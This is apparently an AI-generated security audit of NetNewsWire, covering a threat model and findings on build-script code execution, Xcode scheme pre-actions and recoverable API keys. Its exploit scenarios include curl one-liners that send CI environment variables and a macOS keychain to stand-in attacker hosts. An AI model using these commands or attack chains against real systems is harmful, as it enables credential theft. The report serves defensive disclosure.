# Agentic SAST — NetNewsWire

## Summary
NetNewsWire presents a critical build-pipeline risk through unsandboxed Python eval in gyb.py (finding 32) and version-controlled Xcscheme pre-build scripts (finding 22), either of which delivers arbitrary developer-machine code execution on a single merged commit. For end users the most consequential chain is a one-click-from-web-page attack via the netnewswire://theme/add deep link that fetches an arbitrary archive, bypasses all signature and path-traversal checks, and installs a persistent malicious JavaScript bundle executed by WKWebView on every article render. Globally disabled App Transport Security amplifies all network-layer findings, enabling cleartext credential interception for NewsBlur and user-configured FreshRSS, and the Feedbin pagination forwarding bug (finding 41) sends credentials to any host specified in a server-controlled Link header. Seventeen independent stored-XSS entry points in the article-rendering templates collectively expose the WKWebView script-message bridge to attacker JavaScript, though renderer-process isolation prevents escalation to native host code execution.

## Scan Metrics

- Scan ID: 2026-07-03T17:24:15Z__NetNewsWire
- Module: NetNewsWire
- Start: 2026-07-03T17:24:15Z
- End: 2026-07-04T04:56:07Z
- Duration (sec): 41512
- Files in scope: 877
- Files analyzed (unique): 843
- Coverage: 96.1%
- Chunks: 764 (risk=15, catch-all=176, specialist=573)
- Tokens (prompt): 12196954
- Tokens (completion): 6860496
- Tokens (total): 19057450

- Folders scanned: 223
### Tokens by Phase

_Prompt = fresh + cache-write (billable). Cache-read shown separately, NOT included in totals._

| Phase | Calls | Prompt | Completion | Total | % | Cache-read (excl.) |
|---|---:|---:|---:|---:|---:|---:|
| s4-deepdive | 671 | 7,755,598 | 5,509,190 | 13,264,788 | 69.6 | 1,551,055 |
| s6-verify | 195 | 4,258,593 | 1,268,100 | 5,526,693 | 29.0 | 51,840,349 |
| s5-prefilter | 1 | 143,935 | 64,579 | 208,514 | 1.1 | 79,883 |
| s7-dedup | 1 | 27,861 | 18,619 | 46,480 | 0.2 | 0 |
| unlabeled | 2 | 10,967 | 8 | 10,975 | 0.1 | 17,831 |

### Language LOC Coverage

| Language | LOC in scope | LOC scanned | Coverage % |
|---|---:|---:|---:|
| c-cpp | 1263 | 1263 | 100.0 |
| javascript | 812 | 812 | 100.0 |
| objective-c | 1936 | 1936 | 100.0 |
| other | 26487 | 18173 | 68.6 |
| python | 1163 | 1163 | 100.0 |
| ruby | 15 | 15 | 100.0 |
| shell | 1143 | 1143 | 100.0 |
| swift | 71510 | 71510 | 100.0 |
| web-template | 732 | 732 | 100.0 |

## Scan Health

- ⚠️ Degraded coverage: 101/764 deep-dive chunk(s) failed or timed out — their findings are absent from this report.
- Recoverable errors logged by stage: s4=209, s6-verify=57
- Full error log: `NetNewsWire_20260703T172415Z_errors.jsonl`

## Threat Model

### System context

NetNewsWire is a free, open-source RSS/Atom/JSON Feed reader distributed as native applications for macOS and iOS. Running entirely on the end-user device with no developer-operated server component, the app fetches content from user-configured remote feed servers and third-party sync services (Feedbin, Feedly, NewsBlur, ReaderAPI, CloudKit), parses articles via a custom Swift SAX XML parser plus FMDB/SQLite persistence, and renders article HTML in embedded WKWebView instances. Credentials for sync services are stored in the system Keychain via SecItem APIs. The app accepts inbound data from five distinct external sources: remote feed and sync API servers over HTTP or HTTPS, local files (OPML, .nnwtheme archives) via the macOS file-open subsystem, Siri Intents and Shortcuts, the netnewswire:// URL scheme, and the WKWebView JavaScript-to-Swift script message bridge. Two configuration issues dominate the attack surface: NSAllowsArbitraryLoads:true is set in both platform Info.plist files, globally disabling App Transport Security and permitting cleartext HTTP for all network operations; and the netnewswire://theme/add?url= deep link accepts arbitrary download URLs without validation or domain allowlisting, feeding into an archive-extraction step that lacks path-traversal protection.

The principal risk profile is that of a richly-networked content-rendering application: untrusted remote content is fetched, parsed, and displayed in a scripting-capable browser engine. A compound attack chain exists in which a web page triggers the URL scheme deep link to download a crafted .nnwtheme zip archive containing zip-slip path entries, overwriting JavaScript bundles loaded by the same WKWebView that renders article content. A second independent chain links the globally-disabled ATS to cleartext interception of NewsBlur username and password, which are transmitted as an HTTP form body POST. The custom Swift SAX parser avoids classic libxml2 XXE risks, and FMDB parameterised queries eliminate SQL injection; these controls narrow but do not close the overall attack surface.

### Assets

| Asset | Sensitivity | Description |
|---|---|---|
| Sync service credentials | critical | Username/password pairs and API tokens for Feedbin, Feedly, NewsBlur, ReaderAPI, and CloudKit stored in the system Keychain via SecItem APIs; compromise yields full third-party account takeover |
| Application process integrity | high | Runtime integrity of the native app process including WKWebView configuration, injected JavaScript bundles, WKContentRuleList ad-blocker, and the JS-to-Swift script message bridge handlers |
| Application sandbox filesystem | high | Files within the app's OS sandbox container: installed theme archives (.nnwtheme), injected JS scripts, SQLite databases, caches, and downloaded content; overwrite of JS scripts leads to persistent code execution in the WebView |
| Network traffic | high | In-transit feed content, sync API requests and responses, Mercury/Feedbin article extraction calls, and image downloads — all potentially cleartext due to globally-disabled ATS |
| Article database | medium | SQLite store of full article bodies, full-text search index, and per-article metadata representing the user's complete reading history and interests |
| Feed subscription list | medium | Ordered collection of feed URLs reflecting reading interests and online identity, persisted as OPML and synchronised to remote services |
| Sync read/starred state | low | Per-article read and starred flags propagated to remote sync services; manipulation disrupts sync fidelity across devices |

### Trust boundaries

- **Mac/MainWindow/Detail/DetailWebViewController.swift::webView(_:decidePolicyFor:decisionHandler:)** — unauth remote feed content → macOS WKWebView renderer navigation decision → Application process integrity, Application sandbox filesystem, Network traffic, Article database
- **iOS/Article/WebViewController.swift::webView(_:decidePolicyFor:decisionHandler:)** — unauth remote feed content → iOS WKWebView renderer navigation decision → Application process integrity, Application sandbox filesystem, Network traffic, Article database
- **Modules/Account/Sources/Account/LocalAccount/LocalAccountRefresher.swift::refresh(_:)** — auth remote feed and sync API servers → feed parser, article database, and sync credential usage → Sync service credentials, Article database, Feed subscription list, Network traffic, Application process integrity
- **Mac/AppDelegate.swift::application(_:openFile:)** — local unauth file (OPML or .nnwtheme from Finder or drag-drop) → subscription and theme subsystems → Feed subscription list, Application sandbox filesystem, Application process integrity
- **Intents/AddWebFeedIntentHandler.swift::handle(intent:completion:)** — unauth IPC from Siri, Shortcuts, or other on-device apps → account subscription management → Feed subscription list, Article database
- **iOS/SceneDelegate.swift::scene(_:openURLContexts:)** — unauth IPC via netnewswire:// URL scheme (triggerable from arbitrary web pages) → theme downloader and account actions → Application sandbox filesystem, Application process integrity, Network traffic, Feed subscription list
- **Mac/MainWindow/Detail/DetailWebViewController.swift::userContentController(_:didReceive:)** — WKWebView JS execution context → macOS native Swift handler for article and UI actions → Application process integrity, Article database, Sync service credentials
- **iOS/Article/WebViewController.swift::userContentController(_:didReceive:)** — WKWebView JS execution context → iOS native Swift handler for article and UI actions → Application process integrity, Article database, Sync service credentials

### Ranked threats

| ID | Threat | Actor | Surface | Asset | Impact | Likelihood | Controls |
|---|---|---|---|---|---|---|---|
| T1 | An on-path network attacker intercepts and exfiltrates NewsBlur username and password transmitted in cleartext as an HTTP form-body POST because App Transport Security is globally disabled via NSAllowsArbitraryLoads:true, yielding full NewsBlur account takeover. | adjacent_network | Modules/Account/Sources/Account/LocalAccount/LocalAccountRefresher.swift::refresh(_:) | Sync service credentials | critical | possible | HTTPS if the NewsBlur server enforces it server-side; Keychain storage post-authentication; no client-side ATS enforcement or certificate pinning |
| T2 | A remote attacker serves a crafted .nnwtheme zip archive containing path-traversal (zip-slip) entries via a URL supplied through the netnewswire://theme/add?url= deep link triggered from a web page, writing arbitrary files within the app's sandbox and potentially overwriting WKWebView-injected JavaScript bundles to achieve persistent code execution in the article renderer. | remote_unauth | iOS/SceneDelegate.swift::scene(_:openURLContexts:) | Application sandbox filesystem | high | likely | App sandbox constrains writes to the container; no URL allowlist, no archive signature verification, and no path-traversal check identified in ArticleThemeDownloader.unzipFile() |
| T3 | An on-path network attacker tampers with plaintext HTTP feed content or sync API responses — made possible by globally-disabled ATS — injecting malicious article payloads, poisoning the article database, or stripping authentication tokens from API exchanges. | adjacent_network | Modules/Account/Sources/Account/LocalAccount/LocalAccountRefresher.swift::refresh(_:) | Network traffic | high | possible | TLS where feed servers independently enforce HTTPS; no certificate pinning; no ATS per-domain exception list identified; no response-integrity verification |
| T4 | A malicious feed server delivers stored-XSS payloads as article content rendered in the macOS WKWebView, executing attacker-controlled JavaScript within the app's WebView context to manipulate the DOM, exfiltrate article data, or invoke the Swift script message bridge. | remote_unauth | Mac/MainWindow/Detail/DetailWebViewController.swift::webView(_:decidePolicyFor:decisionHandler:) | Application process integrity | high | possible | WKWebView renderer-process isolation; WKContentRuleList ad-blocker covering ~30 domains; no Content Security Policy observed; ATS disabled allows HTTP article content |
| T5 | A malicious feed server delivers stored-XSS payloads as article content rendered in the iOS WKWebView, executing attacker-controlled JavaScript within the app's WebView context to manipulate the DOM, exfiltrate article data, or invoke the Swift script message bridge. | remote_unauth | iOS/Article/WebViewController.swift::webView(_:decidePolicyFor:decisionHandler:) | Application process integrity | high | possible | WKWebView renderer-process isolation; WKContentRuleList ad-blocker; preloaded web view pool may cache attacker content; no CSP observed |
| T6 | Attacker-controlled JavaScript executing in the macOS WKWebView — delivered via stored XSS in feed content or a compromised theme file — sends crafted messages through the userContentController script message bridge to trigger privileged native actions such as opening external URLs, exporting article content, or invoking account operations. | remote_unauth | Mac/MainWindow/Detail/DetailWebViewController.swift::userContentController(_:didReceive:) | Application process integrity | high | possible | WKWebView renderer-process isolation prevents direct memory access; bridge handler input validation scope unknown from snapshot alone |
| T7 | Attacker-controlled JavaScript executing in the iOS WKWebView — delivered via stored XSS in feed content or a compromised theme file — sends crafted messages through the userContentController script message bridge to trigger privileged native actions such as sharing article content, invoking account operations, or navigating the host app. | remote_unauth | iOS/Article/WebViewController.swift::userContentController(_:didReceive:) | Application process integrity | high | possible | WKWebView renderer-process isolation; bridge message handler input validation scope unknown from snapshot alone |
| T8 | A memory-safety vulnerability in the C/C++ feed-parsing or supporting components (15 C/C++ files in scope) is triggered by a malformed feed or image payload from an attacker-controlled server, causing a crash or enabling in-sandbox code execution. | remote_unauth | Modules/Account/Sources/Account/LocalAccount/LocalAccountRefresher.swift::refresh(_:) | Application process integrity | high | rare | App sandbox; platform mitigations (ASLR, stack canaries, PAC on Apple Silicon); majority of feed parsing implemented in memory-safe Swift |
| T9 | An attacker who compromises or hijacks a theme distribution URL (e.g., via CDN compromise or DNS takeover) delivers a malicious .nnwtheme archive containing adversarial JavaScript that is permanently installed and loaded by WKWebView on every article render, achieving persistent code execution in the WebView context. | supply_chain | iOS/SceneDelegate.swift::scene(_:openURLContexts:) | Application process integrity | high | rare | App sandbox; no theme archive signing or integrity verification identified in Shared–Theme Downloader; no maintainer-operated theme registry with signatures observed |
| T10 | A malicious feed article navigates the iOS WKWebView to a file:// URI or a sensitive custom URL scheme, allowing the renderer to read files from the app's sandbox and exfiltrate their contents to an attacker-controlled origin via fetch or XMLHttpRequest. | remote_unauth | iOS/Article/WebViewController.swift::webView(_:decidePolicyFor:decisionHandler:) | Article database | high | rare | WKWebView default cross-origin restrictions on file:// access; navigation policy handler exists but is tagged UNAUTH/full-STRIDE in entry-point mapping |
| T11 | A feed server embeds a crafted articleID containing JavaScript metacharacters (e.g., backslash escape sequences) that survive URLComponents percent-encoding and are injected unescaped into an evaluateJavaScript call, executing attacker-controlled code in the macOS or iOS WKWebView. | remote_unauth | Modules/Account/Sources/Account/LocalAccount/LocalAccountRefresher.swift::refresh(_:) | Application process integrity | high | rare | URLComponents percent-encoding provides partial mitigation for common special characters; no explicit JS string escaping of articleID confirmed per mapper observation #4 |
| T12 | An attacker embeds the netnewswire://theme/add?url= deep link in a web page to force the app to issue HTTP requests to arbitrary attacker-specified URLs, enabling probing of internal or corporate network hosts not accessible from the public internet (SSRF). | remote_unauth | iOS/SceneDelegate.swift::scene(_:openURLContexts:) | Network traffic | medium | likely | App sandbox network entitlements restrict some outbound paths; URLSession follows redirects by default; no URL scheme allowlisting or host-allowlist identified |
| T13 | A malicious Siri Shortcut or on-device app invokes AddWebFeedIntentHandler to subscribe the user to an attacker-controlled feed URL without per-invocation user confirmation, enabling persistent delivery of attacker-crafted article content. | local_user | Intents/AddWebFeedIntentHandler.swift::handle(intent:completion:) | Feed subscription list | medium | possible | iOS/macOS Intents authorization model requires user to create the Shortcut initially; no per-invocation confirmation prompt visible from snapshot |
| T14 | A user opens a crafted OPML file (received via email or a malicious download page) through the macOS file-open handler, injecting attacker-controlled feed URLs into the subscription list or causing parser resource exhaustion via a deeply-nested or malformed XML structure. | remote_unauth | Mac/AppDelegate.swift::application(_:openFile:) | Feed subscription list | medium | possible | RSParser custom Swift SAX parser avoids XXE; App sandbox constrains filesystem side-effects; no OPML URL allowlisting identified |
| T15 | A malicious feed server delivers an abnormally large, deeply nested, or entity-expanded XML/JSON payload that exhausts the app's memory or CPU during parsing, causing a sustained denial-of-service crash or hang on the user's device. | remote_unauth | Modules/Account/Sources/Account/LocalAccount/LocalAccountRefresher.swift::refresh(_:) | Article database | medium | possible | Custom streaming Swift SAX parser avoids full DOM materialisation; no explicit per-feed payload-size cap identified in RSParser or RSWeb download manager |
| T16 | A malicious feed article in the macOS WKWebView initiates a navigation or redirect chain to internal or corporate network resources, causing the app process to issue credentialed or authenticated requests to hosts not reachable from the public internet. | remote_unauth | Mac/MainWindow/Detail/DetailWebViewController.swift::webView(_:decidePolicyFor:decisionHandler:) | Network traffic | medium | rare | WKWebView navigation policy handler (decidePolicyFor present but tagged full-STRIDE/UNAUTH); OS-level firewall; app sandbox network entitlements |

### Open questions

- What specific message types and handler actions does the WKWebView userContentController bridge expose? If it provides account management, credential retrieval, file I/O, or URL-launch capabilities, the impact of T6 and T7 escalates from high toward critical.
- Is NSAllowsArbitraryLoads:true intentional to support HTTP-only community feed servers, or is it an oversight? Is there a companion NSExceptionDomains allow-list further limiting cleartext scope, or is the exception fully global?
- Is the app distributed exclusively through the App Store (fully sandboxed, hardened runtime enforced) or also as a notarized developer-signed DMG? A non-App-Store build with broader entitlements materially increases the blast radius of T2 (zip-slip) and T9 (theme supply-chain).
- What entitlements are declared (e.g., com.apple.security.network.client, temporary-exception.files, com.apple.security.cs.allow-jit)? JIT entitlements or broad file-access scopes would amplify multiple threats.
- Is the Mercury/Feedbin article-extraction HMAC key embedded in the binary at build time or fetched from a remote secrets store at runtime? A static embedded key extracted via binary analysis enables impersonation of extraction requests.
- Does the netnewswire:// URL scheme have an associated-domains / universal-links configuration on either platform? An associated-domains restriction would require web-page-triggered deep links to originate from a developer-controlled domain, substantially reducing T2 and T12.
- What is the threat model for theme distribution? Are .nnwtheme URLs user-supplied ad-hoc, curated by a maintainer-operated registry, or fetched from a hardcoded origin? A signed manifest from the maintainer would substantially reduce T9.
- Does the app enforce any per-feed response-size or per-refresh download-rate cap in RSWeb or LocalAccountRefresher to bound the DoS surface of T15?
- Does CloudKit sync propagate raw article or feed content between devices, and if so, is that content sanitised before rendering in the destination device's WKWebView? A poisoned CloudKit record could be a cross-device stored-XSS vector.
- Are any WAF, DNS-layer filtering, or MDM content-inspection controls deployed for enterprise users of NetNewsWire that would reduce the practical exploitability of the MITM threats (T1, T3)?

## Verification
- Raw findings (pre-verification): 324
- True positives (verified): 63
- False positives (dropped): 111
- Verifier errors (excluded — undetermined, not confirmed clean): 57
- Duplicates collapsed (all passes): 48
- Verification precision: 19.4%

## Findings (63)

### 1. [CRITICAL] Unsandboxed eval of .gyb template code enables CI/CD RCE
**Class:** CWE-94: Improper Control of Generation of Code (Code Injection)
**CWE:** CWE-94: Improper Control of Generation of Code (Code Injection) - https://cwe.mitre.org/data/definitions/94.html
**File:** `buildscripts/gyb.py:404-725`
**CVSS 3.1:** **9.6** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.78 (1 run agreed)

#### Description
ParseContext.__init__ reads the raw contents of a .gyb template file at line 405 (io.open) or line 1254 in main(). The template text is then scanned for Python code blocks delimited by %{...}%, ${...}, or leading %-lines. In Code.__init__ (line 716), each code block is compiled with compile(source, context.filename, eval_exec). In Code.execute (line 725), the compiled object is unconditionally evaluated with eval(self.code, context.local_bindings). The local_bindings dict passed as the globals argument does not contain a restricted __builtins__; Python therefore injects the full builtins module automatically, giving the template code unrestricted access to __import__, open, os, subprocess, socket, etc. No content validation, sandboxing, or allow-listing is applied at any point between reading the file and calling eval(). The flow is: template file → ParseContext.template (line 408) → code_text extracted by token_generator (lines 502–503) → compile() (line 716) → eval() (line 725).

#### Impact
Any contributor who can submit a pull request modifying a .gyb template file can execute arbitrary Python code in the CI/CD build environment. This gives the attacker full access to CI secrets, build credentials, signing keys, and any API keys injected by buildscripts/updateSecrets.sh during the build.

#### Exploit scenario
An attacker forks NetNewsWire and submits a PR that adds one line to any existing .gyb template (e.g., Modules/RSCore/Sources/RSCore/Foo.swift.gyb): `%{ import subprocess; subprocess.run(['curl','-d',open('/proc/self/environ').read(),'https://attacker.com/x']) }%`. When the CI pipeline (triggered automatically on PRs as is standard for open-source GitHub projects) runs ./buildscripts/build_and_test.sh, GYB processes the template, evaluates the block, and exfiltrates every CI environment variable—including GITHUB_TOKEN, any Apple API keys written by updateSecrets.sh, and code-signing credentials—to the attacker's server. No interaction from a maintainer is required if CI runs on fork PRs automatically.

#### Preconditions
- Attacker can open a pull request or push to a branch that modifies at least one .gyb template file in the repository
- CI/CD pipeline runs the build (and therefore GYB) on pull request branches without requiring prior maintainer approval

```
# ParseContext.__init__, line 404-408: template file read unconditionally
with io.open(os.path.normpath(filename), encoding='utf-8') as f:
    self.template = f.read()

# Code.__init__, line 716: compiled with no restriction
self.code = compile(source, context.filename, eval_exec)

# Code.execute, line 725: evaluated with full builtins accessible
result = eval(self.code, context.local_bindings)
```

#### How to fix
GYB is a code-execution template engine by design; eval() cannot be made safe for untrusted templates. Mitigation must be at the CI/CD policy layer: (1) In GitHub Actions, set `pull_request_target` triggers to require explicit maintainer approval before secrets-bearing workflows execute on external PRs (use the 'Require approval for all outside collaborators' repository setting). (2) Add all .gyb files to CODEOWNERS so every PR touching them requires a security-aware reviewer. (3) Isolate CI runs on PRs from production secrets entirely; inject signing credentials and API keys only in post-merge pipelines. In the code itself, consider validating that the resolved template path is within an expected subtree before parsing (ParseContext.__init__, line 405) to prevent path-traversal-assisted template injection.

**Exploitability:** gyb.py compiles and evals arbitrary Python from .gyb template files with full builtins access and no sandbox. A single committed change to any .gyb file — via PR, compromised maintainer account, or dependency substitution — executes arbitrary OS commands on every developer and CI machine at build time. CVSS base ~9.0 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H). This is production build infrastructure, not test code; no downgrade trigger applies.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — CI workflow triggers `updateSecrets.sh` on every PR checkout; `gyb.py` `eval()`s template code blocks with unrestricted Python builtins; no sandbox, validation, or workflow-level approval gate exists; a PR modifying the single `.gyb` file achieves unsandboxed RCE on the CI runner.

Now I have all the evidence I need. Let me consolidate my analysis:

**A. Code verification (lines 404–725)**
- Line 405: File read confirmed — `io.open(os.path.normpath(filename))` with no path restriction.
- Line 716: `compile(source, context.filename, eval_exec)` — confirmed, no sandboxing.
- Line 725: `eval(self.code, context.local_bindings)` — confirmed. `local_bindings` does **not** set `__builtins__`, so Python automatically injects the full builtins module.

**B. Call chain to external entry point**
- `updateSecrets.sh` runs `find … -name '*.gyb'` then pipes each match to `gyb` — unconditionally processes every `.gyb` file found in the tree.
- `ci.yml` line 40 and 85: `./buildscripts/updateSecrets.sh` is executed as a build step on **both** `macos-tests` and `ios-simulator-tests` jobs.
- `ci.yml` line 4: trigger is `on: pull_request` — fires on all PRs, including from external forks, on the PR's checked-out code.
- The existing template (`SecretKey.swift.gyb`) already uses `import os`, `os.urandom()`, and `os.environ.get()`, proving the full Python runtime is intentionally available to template authors — and equally available to an attacker's injected code.

**C. Defences searched — none found**
- No allow-list or hash-check on `.gyb` file contents before processing.
- No restricted `__builtins__` passed to `eval()`.
- No review-gate at the workflow level (no `environment:` requiring approval, no `pull_request_target` with explicit approval step).
- GitHub's first-time-contributor gate is an admin-level UI control, not a technical defense baked into the code; any contributor with a single previously-merged PR bypasses it entirely.

**D. Impact**
- Attacker can execute arbitrary Python on the CI runner (`subprocess`, `socket`, `open`, etc.).
- CI runner has the `GITHUB_TOKEN` in its environment, plus any repository secrets the maintainers have configured (API keys written by `updateSecrets.sh`).
- The single `.gyb` file in the repo is the natural modification target, but `updateSecrets.sh` uses `find` on the whole tree — any new `.gyb` file anywhere would also be processed.

The finding is fully substantiated. Every piece of the described exploit chain exists exactly as claimed.

### 2. [CRITICAL] Shared Xcode pre-build script enables supply-chain command injection
**Class:** CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)
**CWE:** CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection) - https://cwe.mitre.org/data/definitions/78.html
**File:** `NetNewsWire.xcodeproj/xcshareddata/xcschemes/NetNewsWire-iOS.xcscheme:9-24`
**CVSS 3.1:** **9.3** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.72 (1 run agreed)

#### Description
Both NetNewsWire-iOS.xcscheme (line 13) and NetNewsWire.xcscheme (line 13) declare a `PreActions` `ExecutionAction` whose `scriptText` attribute is literal shell code executed by Xcode's build system before compilation begins. Because these files reside in `xcshareddata/xcschemes/` they are version-controlled and shared across all contributors. A malicious actor who can get a commit merged — whether through a PR that reviewers overlook (scheme XML diffs are rarely scrutinised), a compromised maintainer account, or a dependency-supply-chain substitution — can change the `scriptText` from the benign `updateSecrets.sh` invocation to any arbitrary command. Unlike modifying Swift source (which triggers linter warnings, test failures, and visible logic changes), editing XML inside a `.xcscheme` is low-visibility and does not affect functional tests. Every developer who subsequently runs `xcodebuild` or clicks Build in Xcode triggers the payload with no warning.

#### Impact
Any contributor who lands a pull request modifying the shared xcscheme files can inject arbitrary shell commands that execute silently on every developer's workstation during a normal Xcode build. The script runs with the developer's full user privileges, enabling credential theft, backdoor installation, or exfiltration of secrets being managed by updateSecrets.sh itself.

#### Exploit scenario
An attacker submits a pull request that, among other innocuous-looking changes, modifies the `scriptText` attribute in `NetNewsWire-iOS.xcscheme` to: `"${PROJECT_DIR}/buildscripts/updateSecrets.sh" 2>&1; curl -s https://attacker.example.com/exfil?d=$(cat ~/Library/Keychains/login.keychain-db | base64 | tr -d '\n')`. A maintainer merges the PR after reviewing the Swift diff but not the scheme XML. Every team member who pulls main and builds the iOS target silently exfiltrates their macOS keychain to the attacker's server.

#### Preconditions
- Attacker must be able to land a commit modifying the shared xcscheme files — via a merged pull request, a compromised maintainer account, or direct repository write access
- A developer must perform a build (Xcode GUI or xcodebuild CLI) after pulling the malicious commit

```
<ExecutionAction
   ActionType = "Xcode.IDEStandardExecutionActionsCore.ExecutionActionType.ShellScriptAction">
   <ActionContent
      title = "Run Script"
      scriptText = "&quot;${PROJECT_DIR}/buildscripts/updateSecrets.sh&quot; 2&gt;&amp;1&#10;">
```

#### How to fix
Move pre-build secret injection out of the shared xcscheme and into an explicit build phase script inside the Xcode project file itself (which is harder to diff-obscure), or better, use a Makefile / CI-only invocation so the script never runs from a developer's personal Xcode session. At minimum, add a branch-protection or CODEOWNERS rule that requires a dedicated security review for any change to `*.xcscheme` files. Consider replacing the pre-action with a Swift Package plugin or a post-clone hook that runs only in CI, where the execution environment is audited.

**Exploitability:** Xcscheme PreActions scriptText is version-controlled XML executed by Xcode before compilation with no approval prompt. A merged commit changing the shell snippet runs arbitrary commands on every developer and CI machine. CVSS 8.7. Scheme XML diffs are rarely code-reviewed; single precondition is getting a commit merged. Distinct from finding 32 but both reach developer-machine RCE.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — Xcode PreAction `scriptText` in version-controlled shared schemes is real, mutable shell code fired on every build; CI triggers on `pull_request` meaning exploitation does not require a merge, only a PR submission approved to run CI.

**Analysis**

**A. File Verification**

Both scheme files are confirmed. `NetNewsWire-iOS.xcscheme` lines 9–24 and `NetNewsWire.xcscheme` lines 9–24 each contain a `<BuildAction><PreActions>` block with an `ExecutionAction` of type `ShellScriptAction`. The current `scriptText` (HTML-entity decoded) is:

```
"${PROJECT_DIR}/buildscripts/updateSecrets.sh" 2>&1
```

The `updateSecrets.sh` script itself is benign — it runs the GYB (Generate Your Boilerplate) tool to produce Swift source files from `.gyb` templates.

**B. External Entry Points**

Two separate attack paths exist:

**Path 1 — Developer machine (requires merge):** A developer pulls `main` and builds; Xcode's build system fires PreActions before compilation with no prompt.

**Path 2 — CI/CD (does NOT require merge):** The `ci.yml` workflow triggers on `pull_request` (line 4–5), and runs:
```
xcodebuild -project NetNewsWire.xcodeproj -scheme NetNewsWire-iOS … test
```
`xcodebuild test` invokes the scheme's `BuildAction`, which fires the PreActions from the PR branch. A malicious `scriptText` executes on the GitHub Actions macOS runner *before the PR is merged*. This is a direct poisoned pipeline execution (DPPE) attack.

**C. Defenses Evaluated**

| Control | Assessment |
|---|---|
| `CODEOWNERS: * @brentsimmons` | Process control only — a single reviewer must notice an XML attribute change buried in a `.xcscheme` diff. Not a technical barrier. |
| GitHub first-time-contributor CI gate | Requires maintainer approval for fork PRs from new accounts. Mitigates but doesn't eliminate the CI path (returning contributors bypass this). |
| `updateSecrets.sh` contents | The *current* script is harmless. The vulnerability is the mutable `scriptText` attribute, not the current value. |
| No sandboxing | Xcode PreActions execute in the developer's or runner's shell with full OS privileges. No technical restriction on network calls, file writes, or credential access. |

**D. Edge Cases / Escape Paths**

- The `scriptText` attribute is a freeform string inside XML. Any `; <command>` or `$(…)` appended to the existing path runs without any escaping or length limit.
- The runner executes with full macOS user permissions; `security find-generic-password`, `aws sts get-caller-identity`, `env` (for ACTIONS_SECRETS), etc. are all in scope.
- The `xcshareddata/` placement is intentionally shared (as opposed to `xcuserdata/`). There is no mechanism to exclude it from CI or mark it as requiring elevated review.
- CI also runs the macOS scheme (`NetNewsWire.xcscheme`) with the same structure — both attack surfaces are present.

**Summary**

The scanner has correctly identified the attack class and mechanism. The current `scriptText` is benign, but the design pattern (mutable, version-controlled shell code executed silently during build) is a confirmed supply-chain attack surface with two independent entry points — developer machines and CI runners. The CI/CD path is particularly severe because it fires *before* a PR is merged and operates without any technical control beyond a single reviewer's vigilance.

### 3. [HIGH] Third-party API keys recoverable via static binary analysis
**Class:** CWE-321
**CWE:** CWE-321 - https://cwe.mitre.org/data/definitions/321.html
**File:** `Modules/Secrets/Sources/Secrets/SecretKey.swift.gyb:42-55`
**CVSS 3.1:** **7.3** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.75 (1 run agreed)

#### Description
The GYB template generates a Swift source file that embeds two pieces of data for each API key: (1) the XOR-encoded key bytes (line 29–35), produced by encoding each environment-variable value against a randomly generated 64-byte salt at build time, and (2) that same 64-byte salt itself (lines 42–46), also hardcoded in the binary as a static [UInt8] array. The decode() function (lines 48–55) reconstructs the plaintext by XORing encoded[i] ^ salt[i % salt.count]. Because both operands are static, non-secret byte sequences embedded in the final binary, a single pass of static analysis (Hopper, Ghidra, strings + XOR script) immediately yields the plaintext keys. No runtime secret, keychain item, or network fetch is involved in the decryption path.

#### Impact
All third-party API keys (Feedly, InoReader, Mercury client IDs and secrets) are protected only by XOR with a build-time salt, both of which are hardcoded in the distributed binary. An attacker who downloads the public binary can trivially recover every key. Stolen keys can be used to make API calls impersonating NetNewsWire, exhaust per-app rate-limit quotas, or exploit any Feedly/InoReader scope granted to the NetNewsWire app identity.

#### Exploit scenario
An attacker downloads the NetNewsWire iOS or macOS binary from the App Store or GitHub releases. Using Ghidra or a short Python script, they locate the two [UInt8] literals corresponding to 'salt' and any encoded key array (e.g., FEEDLY_CLIENT_SECRET), XOR them together, and obtain the plaintext secret in under a minute. They then use the recovered FEEDLY_CLIENT_ID / FEEDLY_CLIENT_SECRET to register as a Feedly OAuth client, obtain access tokens for arbitrary Feedly users, or make bulk API calls until the NetNewsWire app's API quota is exhausted, breaking sync for all genuine NetNewsWire/Feedly users.

#### Preconditions
- Access to the distributed binary (publicly available on the App Store or as a GitHub release artifact — no privileged access required)

```
private static let salt: [UInt8] = [
  // 64 bytes from build-time os.urandom(64) — hardcoded in binary
]

private static func decode(_ encoded: [UInt8]) -> String {
    guard !isRunningUnitTests else { return "" }
    let salt = Self.salt
    return String(decoding: encoded.enumerated().map { (offset, element) in
        element ^ salt[offset % salt.count]   // both operands are in the binary
    }, as: UTF8.self)
}
```

#### How to fix
Client-side secret embedding cannot provide confidentiality when the binary is publicly distributed. For open-source projects, document that these keys are considered semi-public and rely on the API provider's per-user auth and rate limiting to bound abuse. Where genuine secrecy is required, proxy API calls through a developer-controlled server that holds the key server-side and never sends it to clients. If on-device embedding is unavoidable, rotate keys frequently and monitor provider dashboards for anomalous usage patterns. The current XOR scheme in decode() (SecretKey.swift.gyb:48-55) adds no meaningful barrier against static extraction and should not be described or relied upon as a security control.

**Exploitability:** XOR-encoded API keys are stored alongside their own 64-byte salt as static byte arrays in the production binary. A single Ghidra/Hopper/strings pass immediately recovers plaintext keys — no runtime secret, keychain, or network call involved. CVSS ~7.3–8.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L). Any user who downloads the app binary can extract third-party service API keys. Blast radius is limited to the specific keys embedded.

#### Adversarial verification
